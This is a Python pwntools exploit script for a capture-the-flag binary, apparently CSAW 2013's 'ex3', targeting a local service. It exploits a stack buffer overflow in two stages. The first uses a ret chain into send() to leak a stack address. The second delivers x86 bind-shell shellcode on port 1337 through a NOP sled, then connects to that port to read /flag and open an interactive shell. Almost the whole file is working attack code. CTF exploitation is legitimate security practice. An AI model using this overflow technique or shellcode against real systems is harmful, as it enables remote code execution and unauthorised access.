#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./ex3"

rhp = {'host':"localhost",'port':34266}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

#preparatory investigation
ret_inst_addr = 0x0804868f  #only ret
call_send_addr = 0x8048d04  #call send()
diff = 0x55c                #diff between buf addr & acquired ebp

#shell bind tcp to 1337
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

def exploit(conn):
  #hard-corded in the binary
  username = "csaw2013"
  password = "S1mplePWD"

  #login
  conn.recvuntil("UserName: ")
  conn.sendline(username)
  conn.recvuntil("Password: ")
  conn.sendline(password)

  #generate payload which leak addr of somewhere on the stack
  #( send(sfd=4, older ebp, xxx, 0) )
  payload = "A"*0x420
  payload += p32(ret_inst_addr)*3
  payload += p32(call_send_addr)
  payload += p32(4) #sfd (always 4 in this binary)
  temp_len = len(payload)

  #send payload and run
  conn.recvuntil("Entry Info: ")
  conn.sendline("-1")
  conn.send(payload)

  #get and calc the stack addr
  stack_addr = unpack(conn.recvall()[0:4])
  buf_addr = stack_addr - diff
  target_addr = buf_addr + 0x420 + 0x20
  print("stack: "+hex(stack_addr))
  print("buf  : "+hex(buf_addr))

  #disconnect
  conn.close()

  #reconnect (stack structure is identical to older one)
  reconn = remote(rhp["host"],rhp["port"])
  
  #login
  reconn.recvuntil("UserName: ")
  reconn.sendline(username)
  reconn.recvuntil("Password: ")
  reconn.sendline(password)

  #generate payload which contains shellcode
  payload  = "A"*0x420
  payload += p32(target_addr)*3
  payload += p8(0x90)*40
  payload += p8(0x90)*(len(payload)%16)
  payload += shellcode
  
  #send shellcode and run
  reconn.recvuntil("Entry Info: ")
  reconn.sendline("-1")
  reconn.send(payload)
  
  #disconnect
  reconn.close()

  #connect to the port opened by me and get the flag
  shell = remote("127.0.0.1",1337)
  shell.sendline("cat /flag")
  shell.interactive()
  
if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode child
      b *0x8048f7a
      b *0x08049113
    """
    conn = gdb.debug(FILENAME,cmd)
else:
    conn = remote(rhp['host'],rhp['port'])
exploit(conn)
conn.interactive()
